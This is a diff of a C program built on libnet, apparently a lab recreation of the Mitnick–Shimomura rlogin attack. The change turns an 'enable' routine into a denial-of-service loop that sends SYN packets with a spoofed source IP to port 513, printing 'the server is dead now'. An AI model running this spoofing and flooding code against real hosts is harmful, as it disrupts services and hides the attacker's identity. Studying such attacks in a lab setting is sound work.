@@ -15,7 +15,7 @@ char * SERVER_IP = "172.16.16.3";
 #define PAYLOAD_RST "enable"
 
 //function definitions
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t fake_ip);
 
 //shimomura you're doomed
 int main (void)
@@ -49,23 +49,21 @@ int main (void)
 	}
 
 	//dos the server
-	char enable[] = "enable";
+	char disable[] = "disable";
 	int i;
-	printf("Starting the enable sequence\n");
-	for (i = 0; i < 5; i++)
+	printf("Starting the DOS\n");
+	for (i = 0; i < 15; i++)
 	{
-
-		//printf("enable\n");
-		send_syn(513, (uint8_t *) enable, (u_short) strlen(enable), l, server_ip, fake_ip);
+		//craft and send 10 packets with "disable" payload
+		//printf("disable\n");
+		send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, fake_ip);
 	}
-	//now the server is no longer blocked
-	printf("The server is now responsive again\n");
-
+	printf("the server is dead now\n");
 	exit(EXIT_SUCCESS);
 }
 
 
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t fake_ip)
 {
 
 	libnet_ptag_t t;
@@ -102,7 +100,7 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		libnet_get_prand(LIBNET_PR8),							//ttl
     IPPROTO_TCP,															//upper protocol
     0,																				//checksum, 0 to autofill
-    kevin_ip,																	//src, I use a random fake ip
+    fake_ip,																	//src, I use a random fake ip
     server_ip,																//destination
     NULL,																			//payload
     0,																				//payload len
